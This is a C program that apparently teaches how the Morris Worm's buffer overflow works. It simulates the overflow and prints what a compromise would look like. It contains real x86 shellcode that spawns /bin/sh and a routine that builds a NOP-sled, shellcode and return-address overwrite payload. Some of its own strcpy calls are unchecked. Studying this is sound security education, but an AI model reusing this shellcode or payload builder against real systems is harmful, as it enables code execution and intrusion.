// Morris Worm Buffer Overflow with Simulated Overflow
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


/* 

The worm exploited several vulnerabilities of targeted systems, including:

    A hole in the debug mode of the Unix sendmail program
    A buffer overflow or overrun hole in the finger network 
        service
    The transitive trust enabled by people setting up network 
        logins with no password requirements via remote 
        execution (rexec) with Remote Shell (rsh), termed 
        rexec/rsh
*/

/*
 * ========================= ATTACK PAYLOAD =========================
 * Simplified version of the Morris Worm's payload
 */
char shellcode[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90"  // NOP sled
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"  // Assembly instructions
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50"  // would call execve("/bin/sh")
    "\x53\x89\xe1\xb0\x0b\xcd\x80";     // Actual x86 shellcode

void vulnerable_function(char *input);
void simulate_worm_infection();



/*
 * The vulnerable function containing the buffer overflow
 */
void vulnerable_function(char *input) {
    char buffer[256];  // Fixed-size vulnerable buffer
    int (*return_function)() = NULL;  // Function pointer to overwrite
    int input_length = strlen(input);
    int simulation_mode = 0;
    
    printf("[Vulnerable] Buffer at: %p\n", buffer);
    printf("[Vulnerable] Return function pointer at: %p\n", &return_function);
    
    //modern compiler/debugger creates a stack smash error to stop the program/ buffer overflow:
        //before this error can be created,
    // Check if input is large enough to cause an overflow
    if (input_length > 256) {
        printf("[Detection] Input length (%d bytes) exceeds buffer size (256 bytes)\n", input_length);
        simulation_mode = 1;
        
        // Safe copy of the first 256 bytes only
        memcpy(buffer, input, 256);
        
        // Simulate what would happen to return function pointer
        if (input_length >= 272) {
            // Calculate where the return address would be overwritten
            unsigned long simulated_addr = *((unsigned long *)(input + 272));
            return_function = (int (*)())simulated_addr;
            
            printf("[Simulation] In a vulnerable system, buffer would overflow\n");
            printf("[Simulation] The return address would be overwritten\n");
        }
    } else {
        // Safe operation - normal copy when no overflow
        strcpy(buffer, input);
    }
    
    // Show what happened to the stack (safely)
    printf("\n[Debug] Buffer contents (first 300 bytes):\n");
    for (int i = 0; i < 300 && i < (simulation_mode ? 256 : input_length + 44); i++) {
        if (i % 16 == 0) printf("\n%04x: ", i);
        if (i < 256) {
            printf("%02x ", (unsigned char)buffer[i]);
        } else if (simulation_mode) {
            // For bytes beyond the buffer, show what would be there in simulation mode
            if (i < input_length && i - 256 < 44) {
                printf("%02x* ", (unsigned char)input[i]);  // Mark simulated overflow bytes with *
            } else {
                printf("XX* ");  // Placeholder for memory not in our buffer
            }
        } else {
            printf("XX ");  // Placeholder for memory not in our buffer
        }
    }
    
    printf("\n\n[Debug] Return function pointer value: %p\n", return_function);
    
    if (return_function != NULL) {
        printf("[Debug] WARNING: Return function pointer was overwritten!\n");
        printf("[Debug] Original program flow has been compromised.\n");
        
        if (simulation_mode) {
            printf("\n[Simulation] Control flow hijacked! Starting execution at %p\n", return_function);
            printf("[Simulation] In a vulnerable system without protections:\n");
            printf("[Simulation] 1. Execution would jump to the shellcode in the buffer\n");
            printf("[Simulation] 2. The NOP sled would guide execution to the actual payload\n");
            printf("[Simulation] 3. The shellcode would execute with the privileges of the program\n");
            
            // Simulate successful execution of shellcode
            simulate_worm_infection();
        }
    }
}

/*
 * Simulate what happens after successful exploitation
 */
void simulate_worm_infection() {
    printf("\n===== SYSTEM COMPROMISED =====\n");
    printf("Morris Worm would now:\n");
    printf("1. Connect back to attacker\n");
    printf("2. Download worm code\n");
    printf("3. Compile on target\n");
    printf("4. Spread to other machines\n");
    printf("===============================\n");
}

/*
 * Generate attack string that:
 * 1. Fills buffer with NOP sled and shellcode
 * 2. Overwrites return address
 */
void generate_attack(char *attack_string, size_t size, void *target_buffer) {
    size_t i;
    unsigned long target_addr = (unsigned long)target_buffer + 64;
    
    memset(attack_string, 0, size);
    
    // Build attack string:
    for (i = 0; i < 128; i++) {
        attack_string[i] = 0x90;  // NOP sled
    }
    
    memcpy(attack_string + 128, shellcode, strlen(shellcode));
    
    for (i = 128 + strlen(shellcode); i < 272; i++) {
        attack_string[i] = 'A';  // Padding
    }
    
    // Overwrite return address
    *((unsigned long *)(attack_string + 272)) = target_addr;
    
    printf("[Attack] Generated payload targeting address %p\n", (void *)target_addr);
}

int main(int argc, char *argv[]) {
    char input[1024];
    char *attack_payload = NULL;
    void *buffer_addr = NULL;
    
    printf("\n===== Morris Worm Vulnerability Simulation =====\n");
    printf("This program simulates the buffer overflow technique used by the Morris Worm\n");
    printf("It will safely demonstrate the attack without triggering stack protections\n\n");
    
    // Disable buffering for stdout to see output immediately
    setbuf(stdout, NULL);
    
    if (argc > 1 && strcmp(argv[1], "--attack") == 0) {
        // Attack simulation mode
        printf("[Info] Probing for buffer address...\n");
        strcpy(input, "probe");
        vulnerable_function(input);
        
        buffer_addr = (void *)strtoul(argv[2], NULL, 0);
        if (!buffer_addr) {
            printf("Usage: %s --attack 0xADDRESS\n", argv[0]);
            return 1;
        }
        
        attack_payload = malloc(1024);
        if (!attack_payload) {
            perror("malloc failed");
            return 1;
        }
        
        printf("\n[Attack] Generating attack payload...\n");
        generate_attack(attack_payload, 1024, buffer_addr);
        
        printf("\n[Attack] Executing attack...\n");
        vulnerable_function(attack_payload);
        
        free(attack_payload);
    } else {
        // First run with input "hello"
        printf("\n===== First Run =====\n");
        strcpy(input, "hello");
        printf("Using input: %s\n", input);
        vulnerable_function(input);
        

        printf("\n===== Second Run =====\n");
        strcpy(input, "Cats captivate us with their enigmatic nature and instinctive behaviors. The more time humans dedicate to observing these feline companions, the more astonishing facts we uncover about them. Although we might never fully decipher all their mysteries, what we have learned reveals the remarkable nature of cats. Whether it’s their unique gait or their distinctive means of communication, there’s no denying it: cats are truly exceptional.To learn more about your favorite animal, check out these 39 amazing facts about cats…The Marvelous Miracle of the Cat BodyFeline bodies are a marvel. They can defy the laws of physics to occupy impossible spaces or run so fast, the eye can’t keep up.");
        printf("Using input: %s\n", input);
        vulnerable_function(input);
    }
    
    return 0;
}